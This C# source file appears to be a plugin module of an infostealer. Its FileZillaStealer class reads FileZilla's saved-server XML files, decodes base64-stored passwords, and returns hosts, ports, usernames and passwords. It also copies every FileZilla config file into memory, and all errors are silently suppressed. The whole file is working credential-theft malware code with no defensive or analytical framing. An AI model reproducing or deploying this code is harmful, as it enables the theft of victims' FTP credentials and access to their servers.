using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;

namespace Plugin.Apps
{
    public class FileZillaStealer
    {
        private static readonly string[] FileZillaPaths = new string[]
        {
            "%APPDATA%\\FileZilla\\recentservers.xml",
            "%APPDATA%\\FileZilla\\sitemanager.xml"
        };
        
        public static List<FileZillaCredential> ExtractCredentials()
        {
            List<FileZillaCredential> credentials = new List<FileZillaCredential>();
            
            foreach (string path in FileZillaPaths)
            {
                try
                {
                    string expandedPath = Environment.ExpandEnvironmentVariables(path);
                    
                    if (!File.Exists(expandedPath))
                        continue;
                    
                    XmlDocument doc = new XmlDocument();
                    doc.Load(expandedPath);
                    
                    XmlNodeList serverNodes = doc.SelectNodes("//Server");
                    
                    foreach (XmlNode node in serverNodes)
                    {
                        try
                        {
                            FileZillaCredential cred = new FileZillaCredential();
                            
                            XmlNode hostNode = node.SelectSingleNode("Host");
                            if (hostNode != null) cred.Host = hostNode.InnerText;
                            
                            XmlNode portNode = node.SelectSingleNode("Port");
                            if (portNode != null) cred.Port = portNode.InnerText;
                            
                            XmlNode userNode = node.SelectSingleNode("User");
                            if (userNode != null) cred.Username = userNode.InnerText;
                            
                            XmlNode passNode = node.SelectSingleNode("Pass");
                            if (passNode != null)
                            {
                                string passAttr = passNode.Attributes["encoding"]?.Value;
                                if (passAttr == "base64")
                                {
                                    cred.Password = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(passNode.InnerText));
                                }
                                else
                                {
                                    cred.Password = passNode.InnerText;
                                }
                            }
                            
                            if (!string.IsNullOrEmpty(cred.Host))
                            {
                                credentials.Add(cred);
                            }
                        }
                        catch { }
                    }
                }
                catch { }
            }
            
            return credentials;
        }
        
        public static Dictionary<string, byte[]> StealConfigFiles()
        {
            Dictionary<string, byte[]> files = new Dictionary<string, byte[]>();
            
            try
            {
                string configDir = Environment.ExpandEnvironmentVariables("%APPDATA%\\FileZilla");
                
                if (Directory.Exists(configDir))
                {
                    string[] configFiles = Directory.GetFiles(configDir, "*.xml", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in configFiles)
                    {
                        try
                        {
                            string fileName = Path.GetFileName(file);
                            files[$"FileZilla_{fileName}"] = File.ReadAllBytes(file);
                        }
                        catch { }
                    }
                }
            }
            catch { }
            
            return files;
        }
    }
    
    public class FileZillaCredential
    {
        public string Host { get; set; }
        public string Port { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
        
        public override string ToString()
        {
            return $"{Host}:{Port} | {Username}:{Password}";
        }
    }
}
